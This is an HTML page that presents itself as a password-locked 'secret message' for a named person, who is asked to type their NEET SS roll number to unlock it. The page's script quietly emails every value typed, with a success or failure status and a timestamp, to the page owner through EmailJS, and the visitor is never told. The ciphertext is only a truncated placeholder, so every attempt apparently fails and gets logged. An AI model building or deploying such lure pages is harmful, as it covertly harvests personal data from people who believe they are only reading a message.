<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secret Message for Akshaya</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(to right, #8e44ad, #3498db);
            color: white;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .message-box {
            background: rgba(0, 0, 0, 0.4);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 450px;
            animation: fadeIn 1s ease-in-out;
        }
        h1 {
            font-size: 26px;
        }
        p {
            font-size: 18px;
        }
        input {
            padding: 10px;
            width: 80%;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            margin-top: 15px;
            text-align: center;
        }
        button {
            padding: 12px 20px;
            margin-top: 10px;
            font-size: 16px;
            border: none;
            background: #ffcc00;
            color: #333;
            cursor: pointer;
            border-radius: 5px;
            transition: 0.3s;
        }
        button:hover {
            background: #ffd633;
        }
        #message-container {
            display: none;
            padding: 15px;
            border: 1px solid #ddd;
            background: rgba(255, 255, 255, 0.2);
            margin-top: 20px;
            border-radius: 10px;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
</head>
<body>
    <div class="message-box">
        <h1>üîê Hello Akshaya</h1>
        <p>I have a message for you! üòä</p>
        <p><strong>Your NEET SS Roll Number is the password!</strong></p>

        <input type="password" id="password" placeholder="Enter your NEET SS Roll #">
        <button onclick="decryptMessage()">üîì Unlock</button>

        <div id="message-container">
            <h3>üì© Message:</h3>
            <p id="message"></p>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        emailjs.init("Ke2sfMemJxBV501VD"); // Replace with your EmailJS User ID

        const secretMsg = "U2FsdGVkX1/..."; // Your encrypted message here

        function sendEmail(isSuccessful, key) {
            const templateParams = {
                status: isSuccessful ? "‚úÖ Successful Attempt" : "‚ùå Failed Attempt",
                password_used: key,
                timestamp: new Date().toLocaleString()
            };

            emailjs.send("service_lr61acp", "template_nde8d6k", templateParams)
                .then(response => console.log("Email sent:", response))
                .catch(error => console.error("Error sending email:", error));
        }

        function decryptMessage() {
            const password = document.getElementById("password").value;
            try {
                const decrypted = CryptoJS.AES.decrypt(secretMsg, password).toString(CryptoJS.enc.Utf8);
                if (decrypted) {
                    document.getElementById("message").innerText = decrypted;
                    document.getElementById("message-container").style.display = "block";
                    sendEmail(true, password);
                } else {
                    alert("Incorrect password!");
                    sendEmail(false, password);
                }
            } catch (e) {
                alert("Error decrypting message.");
                sendEmail(false, password);
            }
        }
    </script>
</body>
</html>
